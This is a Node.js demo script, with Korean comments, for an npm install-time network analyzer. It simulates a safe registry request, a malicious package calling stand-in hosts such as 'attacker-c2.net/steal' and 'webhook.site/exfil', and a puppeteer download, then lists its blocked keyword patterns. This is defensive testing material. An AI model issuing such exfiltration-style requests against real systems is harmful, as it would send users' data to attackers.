'use strict';

/**
 * network-demo.js
 * install-time network behavior analysis 시연
 */

const networkAnalyzer = require('../src/network-analyzer');
const https = require('https');
const http = require('http');

function separator(title) {
  console.log('\n' + '═'.repeat(52));
  console.log(`  ${title}`);
  console.log('═'.repeat(52));
}

async function runNetworkDemo() {
  separator('install-time Network Behavior Analysis 데모');
  console.log('패키지 설치 중 네트워크 요청 실시간 감시\n');

  // ── 시나리오 1: 안전한 npm 요청 ─────────────────────
  separator('1. 안전한 요청 (npm registry)');
  networkAnalyzer.start('safe-pkg');

  // npm registry 요청 시뮬레이션 (허용)
  await new Promise((resolve) => {
    const req = https.request({ hostname: 'registry.npmjs.org', path: '/', method: 'GET' }, (res) => {
      res.resume();
      res.on('end', resolve);
      res.on('error', resolve);
    });
    req.on('error', resolve);
    req.end();
  });

  networkAnalyzer.stop();
  networkAnalyzer.report();

  // ── 시나리오 2: 악성 패키지 외부 요청 ───────────────
  separator('2. 악성 요청 탐지 (외부 도메인)');
  networkAnalyzer.start('evil-pkg');

  // 알 수 없는 외부 도메인 → 차단
  const r1 = https.request({ hostname: 'some-unknown-server.io', path: '/' }, () => {});
  if (r1.on) r1.on('error', () => {}); if (r1.end) r1.end();

  // 위험 패턴 도메인 → 즉시 차단
  const r2 = https.request({ hostname: 'attacker-c2.net', path: '/steal' }, () => {});
  if (r2.on) r2.on('error', () => {}); if (r2.end) r2.end();
  const r3 = http.request({ hostname: 'webhook.site', path: '/exfil' }, () => {});
  if (r3.on) r3.on('error', () => {}); if (r3.end) r3.end();

  networkAnalyzer.stop();
  networkAnalyzer.report();

  // ── 시나리오 3: puppeteer 같은 케이스 ───────────────
  separator('3. puppeteer 시나리오 (Chromium 다운로드 시도)');
  networkAnalyzer.start('puppeteer');

  const r4 = https.request({ hostname: 'storage.googleapis.com', path: '/chromium-browser-snapshots' }, () => {});
  if (r4.on) r4.on('error', () => {}); if (r4.end) r4.end();
  const r5 = https.request({ hostname: 'registry.npmjs.org', path: '/puppeteer' }, () => {});
  if (r5.on) r5.on('error', () => {}); if (r5.end) r5.end();

  networkAnalyzer.stop();
  networkAnalyzer.report();

  // ── 정리 ─────────────────────────────────────────────
  separator('분석 요약');
  console.log(`
  기존 npm:
  → postinstall이 실행되며 자유롭게 네트워크 접근
  → 어디로 데이터를 보내는지 알 수 없음

  dryinstall network-analyzer:
  → 설치 중 모든 http/https 요청 실시간 감시
  → npm registry 외 도메인은 즉시 차단
  → 위험 패턴(attacker, webhook, exfil 등) 즉시 차단
  → 설치 완료 후 전체 리포트 출력
  `);
}

runNetworkDemo().catch(console.error);
